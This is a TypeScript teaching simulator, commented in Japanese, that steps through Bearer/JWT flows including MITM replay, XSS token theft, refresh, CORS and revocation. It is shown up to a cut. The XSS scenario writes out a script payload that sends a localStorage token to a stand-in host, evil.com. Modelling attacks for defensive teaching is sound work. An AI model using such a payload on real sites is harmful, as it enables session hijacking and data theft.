/**
 * network.ts — ネットワーク層エミュレーション
 *
 * Bearer トークン認証がHTTPリクエスト/レスポンスで流れる様子、
 * TLSハンドシェイク、MITM攻撃、トークン漏洩などのシナリオを
 * ステップ実行でシミュレートする。
 */

import { createJwt, verifyJwt } from "./auth.js";
import type { JwtPayload, JwtToken, VerifyResult } from "./auth.js";

// ── ネットワークノード ──

export type NodeRole = "client" | "server" | "auth_server" | "attacker" | "proxy" | "dns";

export interface NetworkNode {
  id: string;
  role: NodeRole;
  label: string;
  /** ノードが保持するトークン (盗聴時にattackerに複製される) */
  tokens: string[];
}

// ── HTTPメッセージ ──

export type HttpMethod = "GET" | "POST" | "PUT" | "DELETE";

export interface HttpHeader {
  name: string;
  value: string;
  /** この値が機密情報かどうか (表示時にハイライト) */
  sensitive?: boolean;
}

export interface HttpRequest {
  method: HttpMethod;
  url: string;
  headers: HttpHeader[];
  body?: string;
}

export interface HttpResponse {
  status: number;
  statusText: string;
  headers: HttpHeader[];
  body?: string;
}

// ── TLS ──

export interface TlsInfo {
  version: string;
  cipherSuite: string;
  /** 証明書の検証結果 */
  certValid: boolean;
  certIssuer?: string;
  certSubject?: string;
}

// ── ネットワークステップ ──

export type NetworkStepType =
  | "dns_resolve"       // DNS解決
  | "tcp_connect"       // TCP 3-way handshake
  | "tls_handshake"     // TLS ハンドシェイク
  | "http_request"      // HTTP リクエスト送信
  | "http_response"     // HTTP レスポンス受信
  | "token_generate"    // トークン生成
  | "token_validate"    // トークン検証
  | "token_attach"      // リクエストにトークン付与
  | "token_intercept"   // 攻撃者がトークン傍受
  | "token_replay"      // 攻撃者がトークンを再利用
  | "redirect"          // HTTPリダイレクト
  | "token_refresh"     // リフレッシュトークン使用
  | "token_revoke"      // トークン無効化
  | "error"             // エラー発生
  | "info";             // 説明ステップ

export type SecurityLevel = "safe" | "warning" | "danger";

export interface NetworkStep {
  step: number;
  type: NetworkStepType;
  from: string;           // ノードID
  to: string;             // ノードID
  label: string;          // 短い説明
  detail: string;         // 詳細な説明
  security: SecurityLevel;
  /** HTTP リクエスト情報 */
  request?: HttpRequest;
  /** HTTP レスポンス情報 */
  response?: HttpResponse;
  /** TLS 情報 */
  tls?: TlsInfo;
  /** 表示用の追加データ */
  data?: Record<string, string>;
  /** シミュレーション上の経過時間 (ms) */
  elapsedMs: number;
}

// ── シミュレーション結果 ──

export interface NetworkSimResult {
  name: string;
  description: string;
  nodes: NetworkNode[];
  steps: NetworkStep[];
  /** 生成されたJWT (あれば) */
  jwt?: JwtToken;
  /** 検証結果 (あれば) */
  verification?: VerifyResult;
  /** 総シミュレーション時間 (ms) */
  totalMs: number;
}

export interface NetworkPreset {
  name: string;
  description: string;
  run: () => NetworkSimResult;
}

// ── ヘルパー ──

const SECRET = "server-hmac-secret-256bit";
const now = () => Math.floor(Date.now() / 1000);

function bearerHeader(token: string): HttpHeader {
  return { name: "Authorization", value: `Bearer ${token}`, sensitive: true };
}

function contentTypeJson(): HttpHeader {
  return { name: "Content-Type", value: "application/json" };
}

/** ネットワーク遅延をシミュレート */
function latency(base: number, jitter: number): number {
  return base + Math.floor(Math.random() * jitter);
}

// ── プリセット定義 ──

/** 1. 正常なBearer認証フロー (HTTPS) */
function presetNormalBearer(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ (SPA)", tokens: [] },
    { id: "auth", role: "auth_server", label: "認証サーバー", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  // DNS解決
  elapsed += latency(20, 10);
  steps.push({ step: ++s, type: "dns_resolve", from: "client", to: "dns", label: "DNS解決", detail: "auth.example.com → 203.0.113.10", security: "safe", elapsedMs: elapsed });

  // TCP接続
  elapsed += latency(30, 15);
  steps.push({ step: ++s, type: "tcp_connect", from: "client", to: "auth", label: "TCP 3-way handshake", detail: "SYN → SYN-ACK → ACK (auth.example.com:443)", security: "safe", elapsedMs: elapsed });

  // TLSハンドシェイク
  elapsed += latency(50, 20);
  steps.push({ step: ++s, type: "tls_handshake", from: "client", to: "auth", label: "TLS 1.3 ハンドシェイク", detail: "ClientHello → ServerHello → 証明書検証 → Finished", security: "safe", tls: { version: "TLS 1.3", cipherSuite: "TLS_AES_256_GCM_SHA384", certValid: true, certIssuer: "Let's Encrypt Authority X3", certSubject: "auth.example.com" }, elapsedMs: elapsed });

  // ログインリクエスト
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "auth",
    label: "POST /auth/login", detail: "ユーザー認証情報を送信 (TLS暗号化済み)",
    security: "safe", elapsedMs: elapsed,
    request: { method: "POST", url: "https://auth.example.com/auth/login", headers: [contentTypeJson(), { name: "Origin", value: "https://myapp.com" }], body: JSON.stringify({ username: "alice@example.com", password: "••••••••" }) },
  });

  // トークン生成
  elapsed += latency(15, 5);
  const payload: JwtPayload = { sub: "user-123", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now(), roles: ["user"], scope: "read write" };
  const jwt = createJwt(payload, SECRET);
  nodes[1]!.tokens.push(jwt.raw);
  steps.push({ step: ++s, type: "token_generate", from: "auth", to: "auth", label: "JWT 生成", detail: `HS256署名 — sub:${payload.sub}, exp:1h, scope:read write`, security: "safe", elapsedMs: elapsed, data: { alg: "HS256", typ: "JWT", exp: "3600s", jti: payload.jti ?? "N/A" } });

  // トークンレスポンス
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_response", from: "auth", to: "client",
    label: "200 OK — トークン発行", detail: "access_token + refresh_token をJSON bodyで返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson(), { name: "Cache-Control", value: "no-store" }, { name: "Strict-Transport-Security", value: "max-age=31536000" }], body: JSON.stringify({ access_token: jwt.raw.slice(0, 40) + "...", token_type: "Bearer", expires_in: 3600, refresh_token: "refresh_xxxxxxxxxxxx" }) },
  });

  // クライアントがトークンを保存
  nodes[0]!.tokens.push(jwt.raw);
  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "トークン保存", detail: "メモリ内 (JavaScript変数) にトークンを保管 — localStorageは使わない (XSSリスク)", security: "safe", elapsedMs: elapsed });

  // APIリクエスト (DNS + TCP + TLS省略、実際は同様)
  elapsed += latency(40, 15);
  steps.push({ step: ++s, type: "tcp_connect", from: "client", to: "api", label: "TCP + TLS (api.example.com:443)", detail: "APIサーバーへの暗号化接続を確立", security: "safe", tls: { version: "TLS 1.3", cipherSuite: "TLS_AES_256_GCM_SHA384", certValid: true, certSubject: "api.example.com" }, elapsedMs: elapsed });

  // Bearerトークン付きリクエスト
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "token_attach", from: "client", to: "client",
    label: "Authorization ヘッダー付与", detail: "Authorization: Bearer <access_token>",
    security: "safe", elapsedMs: elapsed,
    data: { header: `Authorization: Bearer ${jwt.raw.slice(0, 30)}...` },
  });

  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/user/profile", detail: "Bearerトークン付きAPIリクエスト (TLS暗号化済み)",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/user/profile", headers: [bearerHeader(jwt.raw), { name: "Accept", value: "application/json" }] },
  });

  // サーバー側トークン検証
  elapsed += latency(3, 1);
  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証", detail: `署名:✓ 期限:✓ iss:✓ aud:✓ → ${verification.valid ? "有効" : "無効"}`, security: "safe", elapsedMs: elapsed });

  // APIレスポンス
  elapsed += latency(10, 5);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "200 OK — ユーザーデータ", detail: "認証成功、リソースを返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: JSON.stringify({ id: "user-123", name: "Alice", email: "alice@example.com", roles: ["user"] }) },
  });

  return { name: "正常なBearer認証フロー", description: "HTTPS上の安全なBearer認証", nodes, steps, jwt, verification, totalMs: elapsed };
}

/** 2. HTTP平文でのトークン漏洩 (MITM) */
function presetMitmAttack(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ", tokens: [] },
    { id: "attacker", role: "attacker", label: "攻撃者 (MITM)", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  // 警告
  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "⚠ HTTP (非暗号化)", detail: "TLSなし — 同一ネットワーク上の攻撃者が通信を傍受可能", security: "danger", elapsedMs: elapsed });

  // トークン取得済み想定
  const payload: JwtPayload = { sub: "alice", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now(), roles: ["admin"] };
  const jwt = createJwt(payload, SECRET);
  nodes[0]!.tokens.push(jwt.raw);

  // HTTP平文リクエスト
  elapsed += latency(10, 5);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/admin/users (HTTP平文)", detail: "⚠ Authorization ヘッダーが平文で送信される",
    security: "danger", elapsedMs: elapsed,
    request: { method: "GET", url: "http://api.example.com/api/admin/users", headers: [bearerHeader(jwt.raw), { name: "Accept", value: "application/json" }] },
  });

  // 攻撃者が傍受
  elapsed += latency(1, 0);
  nodes[1]!.tokens.push(jwt.raw);
  steps.push({
    step: ++s, type: "token_intercept", from: "attacker", to: "attacker",
    label: "🔓 トークン傍受!", detail: "攻撃者がネットワークパケットからBearerトークンを抽出",
    security: "danger", elapsedMs: elapsed,
    data: { captured: `Authorization: Bearer ${jwt.raw.slice(0, 40)}...`, method: "パケットスニッフィング (Wireshark等)" },
  });

  // 正規レスポンス（サーバーは気づかない）
  elapsed += latency(15, 5);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "200 OK", detail: "正規のレスポンスが返る（サーバーは傍受を検知できない）",
    security: "warning", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"users": [...]}' },
  });

  // 攻撃者がリプレイ攻撃
  elapsed += latency(500, 200);
  steps.push({
    step: ++s, type: "token_replay", from: "attacker", to: "api",
    label: "🔓 リプレイ攻撃!", detail: "攻撃者が盗んだトークンでAPIにアクセス",
    security: "danger", elapsedMs: elapsed,
    request: { method: "DELETE", url: "http://api.example.com/api/admin/users/victim-user", headers: [bearerHeader(jwt.raw), { name: "X-Forwarded-For", value: "192.168.1.100 (攻撃者IP)" }] },
  });

  // サーバーが正規リクエストとして処理
  elapsed += latency(5, 2);
  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 有効", detail: "⚠ 署名・期限は正しい — サーバーは正規ユーザーと区別できない", security: "danger", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "attacker",
    label: "200 OK — 不正操作成功", detail: "攻撃者がadmin権限でユーザー削除に成功",
    security: "danger", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"deleted": "victim-user"}' },
  });

  steps.push({ step: ++s, type: "info", from: "api", to: "api", label: "対策", detail: "① 必ずHTTPS使用 ② HSTS設定 ③ Secure属性のCookie ④ トークンの短い有効期限", security: "warning", elapsedMs: elapsed });

  return { name: "MITM トークン傍受", description: "HTTP平文通信でのBearer漏洩", nodes, steps, jwt, verification, totalMs: elapsed };
}

/** 3. 期限切れトークンとリフレッシュ */
function presetTokenRefresh(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ (SPA)", tokens: [] },
    { id: "auth", role: "auth_server", label: "認証サーバー", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  // 期限切れトークン
  const expiredPayload: JwtPayload = { sub: "bob", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() - 300, iat: now() - 3900, roles: ["user"] };
  const expiredJwt = createJwt(expiredPayload, SECRET);
  nodes[0]!.tokens.push(expiredJwt.raw);

  // 期限切れトークンでAPIアクセス
  elapsed += latency(50, 15);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/data (期限切れトークン)", detail: "前回取得したトークンでAPIリクエスト",
    security: "warning", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(expiredJwt.raw)] },
  });

  // サーバーが検証失敗
  elapsed += latency(3, 1);
  verifyJwt(expiredJwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 期限切れ", detail: `署名:✓ 期限:✗ (${Math.abs(now() - expiredPayload.exp)}秒前に失効)`, security: "warning", elapsedMs: elapsed });

  // 401 Unauthorized
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "401 Unauthorized", detail: "WWW-Authenticate: Bearer error=\"invalid_token\", error_description=\"Token expired\"",
    security: "warning", elapsedMs: elapsed,
    response: { status: 401, statusText: "Unauthorized", headers: [{ name: "WWW-Authenticate", value: 'Bearer error="invalid_token", error_description="Token expired"' }] },
  });

  // クライアントがリフレッシュ開始
  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "トークンリフレッシュ開始", detail: "401を受信 → リフレッシュトークンで新しいアクセストークンを取得", security: "safe", elapsedMs: elapsed });

  // リフレッシュリクエスト
  elapsed += latency(40, 10);
  const refreshToken = "refresh_abc123def456";
  steps.push({
    step: ++s, type: "token_refresh", from: "client", to: "auth",
    label: "POST /auth/token (リフレッシュ)", detail: "grant_type=refresh_token で新トークン要求",
    security: "safe", elapsedMs: elapsed,
    request: { method: "POST", url: "https://auth.example.com/auth/token", headers: [contentTypeJson()], body: JSON.stringify({ grant_type: "refresh_token", refresh_token: refreshToken, client_id: "spa-app" }) },
  });

  // 新トークン生成
  elapsed += latency(15, 5);
  const newPayload: JwtPayload = { sub: "bob", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now(), roles: ["user"] };
  const newJwt = createJwt(newPayload, SECRET);
  steps.push({ step: ++s, type: "token_generate", from: "auth", to: "auth", label: "新JWT生成", detail: "新しいアクセストークン発行 (exp: +1h)", security: "safe", elapsedMs: elapsed });

  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_response", from: "auth", to: "client",
    label: "200 OK — 新トークン", detail: "新しいaccess_tokenを返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson(), { name: "Cache-Control", value: "no-store" }], body: JSON.stringify({ access_token: newJwt.raw.slice(0, 40) + "...", token_type: "Bearer", expires_in: 3600 }) },
  });

  // リトライ
  nodes[0]!.tokens = [newJwt.raw];
  elapsed += latency(30, 10);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/data (リトライ)", detail: "新トークンでAPIリクエストを再送",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(newJwt.raw)] },
  });

  elapsed += latency(3, 1);
  const newVerify = verifyJwt(newJwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 成功", detail: "署名:✓ 期限:✓ iss:✓ aud:✓", security: "safe", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "200 OK — データ取得成功", detail: "リフレッシュ後のリトライが成功",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"data": [...]}' },
  });

  return { name: "トークンリフレッシュ", description: "期限切れ→401→リフレッシュ→リトライ", nodes, steps, jwt: newJwt, verification: newVerify, totalMs: elapsed };
}

/** 4. CORSプリフライトとBearer */
function presetCorsBearer(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ (SPA @ myapp.com)", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー (api.example.com)", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  const payload: JwtPayload = { sub: "user-1", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now() };
  const jwt = createJwt(payload, SECRET);
  nodes[0]!.tokens.push(jwt.raw);

  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "クロスオリジンリクエスト", detail: "myapp.com → api.example.com: オリジンが異なるためCORSプリフライトが必要", security: "safe", elapsedMs: elapsed });

  // プリフライト
  elapsed += latency(50, 15);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "OPTIONS /api/data (プリフライト)", detail: "ブラウザが自動送信するCORSプリフライトリクエスト",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET" as HttpMethod, url: "https://api.example.com/api/data", headers: [{ name: "Origin", value: "https://myapp.com" }, { name: "Access-Control-Request-Method", value: "GET" }, { name: "Access-Control-Request-Headers", value: "Authorization" }] },
  });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "204 No Content (プリフライト応答)", detail: "サーバーがCORSを許可",
    security: "safe", elapsedMs: elapsed,
    response: { status: 204, statusText: "No Content", headers: [{ name: "Access-Control-Allow-Origin", value: "https://myapp.com" }, { name: "Access-Control-Allow-Headers", value: "Authorization, Content-Type" }, { name: "Access-Control-Allow-Methods", value: "GET, POST, PUT, DELETE" }, { name: "Access-Control-Max-Age", value: "86400" }] },
  });

  // 本リクエスト
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/data (本リクエスト)", detail: "プリフライト通過後、Bearerトークン付きリクエスト送信",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(jwt.raw), { name: "Origin", value: "https://myapp.com" }] },
  });

  elapsed += latency(3, 1);
  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証", detail: "署名:✓ 期限:✓ → 認証成功", security: "safe", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "200 OK", detail: "CORS + Bearer 認証成功",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson(), { name: "Access-Control-Allow-Origin", value: "https://myapp.com" }], body: '{"data": "OK"}' },
  });

  return { name: "CORS + Bearer認証", description: "プリフライト→本リクエスト", nodes, steps, jwt, verification, totalMs: elapsed };
}

/** 5. XSSトークン窃取 */
function presetXssTheft(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "被害者ブラウザ", tokens: [] },
    { id: "attacker", role: "attacker", label: "攻撃者サーバー", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  const payload: JwtPayload = { sub: "victim-user", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now(), roles: ["admin"] };
  const jwt = createJwt(payload, SECRET);
  nodes[0]!.tokens.push(jwt.raw);

  steps.push({ step: ++s, type: "info", from: "client", to: "client", label: "⚠ XSS脆弱性", detail: "アプリにXSS脆弱性 — localStorageにトークンを保存している", security: "danger", elapsedMs: elapsed, data: { storage: "localStorage.getItem('access_token')", vulnerability: "入力サニタイズ不備" } });

  // XSSペイロード実行
  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "info", from: "attacker", to: "client",
    label: "XSSペイロード注入", detail: "<script>fetch('https://evil.com/steal?t='+localStorage.getItem('access_token'))</script>",
    security: "danger", elapsedMs: elapsed,
    data: { vector: "掲示板への投稿 (入力サニタイズ不備)", payload: "<img onerror=\"fetch(...)\" src=x>" },
  });

  // トークン送信
  elapsed += latency(30, 10);
  nodes[1]!.tokens.push(jwt.raw);
  steps.push({
    step: ++s, type: "token_intercept", from: "client", to: "attacker",
    label: "🔓 トークン窃取!", detail: "XSSスクリプトがlocalStorageからトークンを読み取り攻撃者サーバーに送信",
    security: "danger", elapsedMs: elapsed,
    request: { method: "GET", url: `https://evil.com/steal?token=${jwt.raw.slice(0, 30)}...`, headers: [] },
  });

  // 攻撃者がトークンを使用
  elapsed += latency(2000, 500);
  steps.push({
    step: ++s, type: "token_replay", from: "attacker", to: "api",
    label: "🔓 窃取トークンでAPI呼び出し", detail: "攻撃者が被害者のadmin権限でAPIにアクセス",
    security: "danger", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/admin/secrets", headers: [bearerHeader(jwt.raw)] },
  });

  elapsed += latency(5, 2);
  const verification = verifyJwt(jwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://api.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 有効", detail: "⚠ 署名・期限とも正しい — サーバーは攻撃を検知不能", security: "danger", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "attacker",
    label: "200 OK — 機密データ漏洩", detail: "攻撃者がadmin権限のデータを取得",
    security: "danger", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"secrets": ["api-key-xxx", "db-password-yyy"]}' },
  });

  steps.push({ step: ++s, type: "info", from: "api", to: "api", label: "対策", detail: "① HttpOnly Cookieにトークン保存 ② CSP設定 ③ 入力サニタイズ ④ トークンの短い有効期限 ⑤ IPバインディング", security: "warning", elapsedMs: elapsed });

  return { name: "XSSトークン窃取", description: "XSSでlocalStorageからトークン漏洩", nodes, steps, jwt, verification, totalMs: elapsed };
}

/** 6. マイクロサービス間認証 */
function presetServiceToService(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "gateway", role: "proxy", label: "APIゲートウェイ", tokens: [] },
    { id: "auth", role: "auth_server", label: "認証サービス", tokens: [] },
    { id: "user_svc", role: "server", label: "ユーザーサービス", tokens: [] },
    { id: "order_svc", role: "server", label: "注文サービス", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  // 外部クライアントのトークン
  const userPayload: JwtPayload = { sub: "user-42", iss: "https://auth.example.com", aud: "https://gateway.example.com", exp: now() + 3600, iat: now(), roles: ["user"], scope: "orders:read profile:read" };
  const userJwt = createJwt(userPayload, SECRET);

  // ゲートウェイがリクエスト受信
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "gateway", to: "gateway",
    label: "リクエスト受信", detail: "GET /api/orders — 外部クライアントからBearerトークン付きリクエスト",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://gateway.example.com/api/orders", headers: [bearerHeader(userJwt.raw)] },
  });

  // ゲートウェイでトークン検証
  elapsed += latency(3, 1);
  const gwVerify = verifyJwt(userJwt.raw, SECRET, { issuer: "https://auth.example.com", audience: "https://gateway.example.com" });
  steps.push({ step: ++s, type: "token_validate", from: "gateway", to: "gateway", label: "ゲートウェイ: JWT検証", detail: `署名:✓ scope:orders:read ✓ → 転送許可`, security: "safe", elapsedMs: elapsed });

  // サービス間トークン生成
  elapsed += latency(5, 2);
  const svcPayload: JwtPayload = { sub: "gateway-internal", iss: "https://gateway.example.com", aud: "https://order-svc.internal", exp: now() + 60, iat: now(), original_sub: "user-42" as unknown as string, scope: "orders:read" };
  const svcJwt = createJwt(svcPayload, "internal-service-secret");
  steps.push({ step: ++s, type: "token_generate", from: "gateway", to: "gateway", label: "内部トークン生成", detail: "サービス間通信用の短命トークン (exp: 60s) — 元ユーザー情報を含む", security: "safe", elapsedMs: elapsed, data: { exp: "60s", original_sub: "user-42", scope: "orders:read" } });

  // 注文サービスへ転送
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_request", from: "gateway", to: "order_svc",
    label: "GET /internal/orders (内部)", detail: "内部トークン付きでサービス間リクエスト",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://order-svc.internal/internal/orders?user=user-42", headers: [bearerHeader(svcJwt.raw), { name: "X-Request-ID", value: "req-abc123" }] },
  });

  // 注文サービスが検証
  elapsed += latency(3, 1);
  steps.push({ step: ++s, type: "token_validate", from: "order_svc", to: "order_svc", label: "注文サービス: JWT検証", detail: "内部トークン検証 — iss:gateway ✓, scope:orders:read ✓", security: "safe", elapsedMs: elapsed });

  // ユーザーサービスに問い合わせ
  elapsed += latency(10, 3);
  const userSvcPayload: JwtPayload = { sub: "gateway-internal", iss: "https://gateway.example.com", aud: "https://user-svc.internal", exp: now() + 60, iat: now(), scope: "profile:read" };
  const userSvcJwt = createJwt(userSvcPayload, "internal-service-secret");
  steps.push({
    step: ++s, type: "http_request", from: "order_svc", to: "user_svc",
    label: "GET /internal/users/user-42", detail: "注文サービスがユーザー情報を取得",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://user-svc.internal/internal/users/user-42", headers: [bearerHeader(userSvcJwt.raw)] },
  });

  elapsed += latency(8, 3);
  steps.push({
    step: ++s, type: "http_response", from: "user_svc", to: "order_svc",
    label: "200 OK — ユーザー情報", detail: "ユーザー名を返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"name": "Alice"}' },
  });

  // 結果をゲートウェイ経由で返却
  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_response", from: "order_svc", to: "gateway",
    label: "200 OK — 注文データ", detail: "注文一覧+ユーザー名を返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"orders": [...], "user": "Alice"}' },
  });

  elapsed += latency(3, 1);
  steps.push({
    step: ++s, type: "http_response", from: "gateway", to: "gateway",
    label: "200 OK — クライアントへ返却", detail: "内部トークンを除去してレスポンスを返却",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"orders": [...], "user": "Alice"}' },
  });

  return { name: "マイクロサービス間認証", description: "ゲートウェイ→内部トークン→サービス間通信", nodes, steps, jwt: userJwt, verification: gwVerify, totalMs: elapsed };
}

/** 7. トークン無効化 (ブラックリスト方式) */
function presetTokenRevocation(): NetworkSimResult {
  const nodes: NetworkNode[] = [
    { id: "client", role: "client", label: "ブラウザ", tokens: [] },
    { id: "auth", role: "auth_server", label: "認証サーバー", tokens: [] },
    { id: "api", role: "server", label: "APIサーバー", tokens: [] },
  ];
  const steps: NetworkStep[] = [];
  let s = 0;
  let elapsed = 0;

  const payload: JwtPayload = { sub: "user-compromised", iss: "https://auth.example.com", aud: "https://api.example.com", exp: now() + 3600, iat: now(), jti: "tok-to-revoke-001", roles: ["user"] };
  const jwt = createJwt(payload, SECRET);
  nodes[0]!.tokens.push(jwt.raw);

  // 通常のアクセス（成功）
  elapsed += latency(50, 15);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/data", detail: "Bearerトークン付きリクエスト",
    security: "safe", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(jwt.raw)] },
  });

  elapsed += latency(3, 1);
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 有効", detail: "署名:✓ 期限:✓ ブラックリスト:未登録 → OK", security: "safe", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "200 OK", detail: "正常にアクセス可能",
    security: "safe", elapsedMs: elapsed,
    response: { status: 200, statusText: "OK", headers: [contentTypeJson()], body: '{"data": "OK"}' },
  });

  // アカウント侵害を検知 → トークン無効化
  elapsed += latency(1000, 300);
  steps.push({ step: ++s, type: "info", from: "auth", to: "auth", label: "⚠ 不正アクセス検知!", detail: "異常なログインパターン検出 — 管理者がトークンを無効化", security: "warning", elapsedMs: elapsed });

  elapsed += latency(10, 3);
  steps.push({
    step: ++s, type: "token_revoke", from: "auth", to: "auth",
    label: "トークン無効化 (ブラックリスト)", detail: `jti: ${payload.jti} をブラックリストに追加 (Redis/DB)`,
    security: "warning", elapsedMs: elapsed,
    data: { jti: payload.jti!, revoked_at: new Date().toISOString(), reason: "不正アクセス検知" },
  });

  // 無効化後のアクセス試行
  elapsed += latency(100, 30);
  steps.push({
    step: ++s, type: "http_request", from: "client", to: "api",
    label: "GET /api/data (無効化後)", detail: "同じトークンでアクセス試行",
    security: "warning", elapsedMs: elapsed,
    request: { method: "GET", url: "https://api.example.com/api/data", headers: [bearerHeader(jwt.raw)] },
  });

  elapsed += latency(5, 2);
  steps.push({ step: ++s, type: "token_validate", from: "api", to: "api", label: "JWT 検証: 無効化済み", detail: "署名:✓ 期限:✓ ブラックリスト:登録済み ✗ → 拒否", security: "warning", elapsedMs: elapsed });

  elapsed += latency(5, 2);
  steps.push({
    step: ++s, type: "http_response", from: "api", to: "client",
    label: "401 Unauthorized", detail: "トークンが無効化されたため拒否",
    security: "warning", elapsedMs: elapsed,
